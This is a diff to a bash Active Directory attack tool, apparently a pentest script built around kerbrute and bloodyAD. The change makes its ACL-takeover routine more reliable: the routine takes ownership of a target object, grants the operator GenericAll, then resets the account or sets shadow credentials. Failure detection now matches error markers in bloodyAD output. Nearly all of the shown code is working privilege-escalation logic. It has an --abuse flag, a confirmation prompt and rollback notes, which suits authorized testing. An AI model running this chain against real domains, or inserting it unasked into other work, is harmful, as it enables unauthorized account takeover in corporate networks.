@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.35.3"
+readonly VERSION="1.35.4"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -2925,21 +2925,32 @@ _abuse_user() {
 # usable right): become owner if needed, grant ourselves GenericAll, then drive
 # the normal reset/shadow. This is the missing link in WriteOwner→GenericAll→
 # reset chains (WriteOwner alone can't reset until you grant yourself the right).
+# True (0) if a bloodyAD invocation's output indicates FAILURE. bloodyAD raises on
+# error (Traceback + a *Exception) and refusals carry insufficient/ERROR_DS/[-]. Its
+# SUCCESS phrasing varies by version ("X has now GenericAll on Y", "... has been
+# updated", "X created"...), so detecting failure is far more reliable than matching
+# a success string (which silently broke the takeover when bloodyAD changed wording).
+_bloody_failed() {
+    grep -qiE 'Traceback|Exception|insufficientAccess|INSUFF_ACCESS|ERROR_DS|not allowed|could not|no such object|invalidCredentials|operation.*fail|^\[-\]|[[:space:]]denied' <<<"$1"
+}
+
 _abuse_acl_takeover() {
     local target="$1"; local ba; mapfile -t ba < <(bloody_args)
     [[ "$DO_ABUSE" != "1" ]] && { info "  (report-only; --abuse to take over ACL of '$target' → GenericAll → reset)"; return 1; }
     abuse_confirm "  Take over '${target}' (set owner if needed, grant ${USER} GenericAll, then reset)?" || return 1
     # 1) Try to grant ourselves GenericAll directly (works if we hold WriteDACL or
-    #    already own the object). If that's refused, take ownership first.
-    if ! bloodyAD "${ba[@]}" add genericAll "$target" "$USER" 2>&1 | tee -a "$LOGFILE" | grep -qiE 'success|granted|added|modif|written'; then
+    #    already own the object). If that's refused, take ownership first. Success is
+    #    judged by ABSENCE of a failure marker (bloodyAD success wording varies).
+    local _o
+    _o=$(bloodyAD "${ba[@]}" add genericAll "$target" "$USER" 2>&1); printf '%s\n' "$_o" >>"$LOGFILE"
+    if _bloody_failed "$_o"; then
         run "bloodyAD ${ba[*]} set owner '$target' '$USER'"
-        if ! bloodyAD "${ba[@]}" set owner "$target" "$USER" 2>&1 | tee -a "$LOGFILE" | grep -qiE 'success|owner|changed|modif|written'; then
-            warn "Could not take ownership of '$target'"; return 1
-        fi
+        _o=$(bloodyAD "${ba[@]}" set owner "$target" "$USER" 2>&1); printf '%s\n' "$_o" >>"$LOGFILE"
+        if _bloody_failed "$_o"; then warn "Could not take ownership of '$target'"; return 1; fi
+        ok "Took ownership of '$target'"
         rb_record "Set owner of $target to $USER" "echo 'Manual: restore original owner of $target'"
-        if ! bloodyAD "${ba[@]}" add genericAll "$target" "$USER" 2>&1 | tee -a "$LOGFILE" | grep -qiE 'success|granted|added|modif|written'; then
-            warn "Took ownership but could not grant GenericAll over '$target'"; return 1
-        fi
+        _o=$(bloodyAD "${ba[@]}" add genericAll "$target" "$USER" 2>&1); printf '%s\n' "$_o" >>"$LOGFILE"
+        if _bloody_failed "$_o"; then warn "Took ownership but could not grant GenericAll over '$target' -- ${_o##*$'\n'}"; return 1; fi
     fi
     rb_record "Granted $USER GenericAll over $target" "bloodyAD ${ba[*]} remove genericAll '$target' '$USER'"
     loot "★ Took over ACL of '${target}' (owner/GenericAll) → reset / shadow"
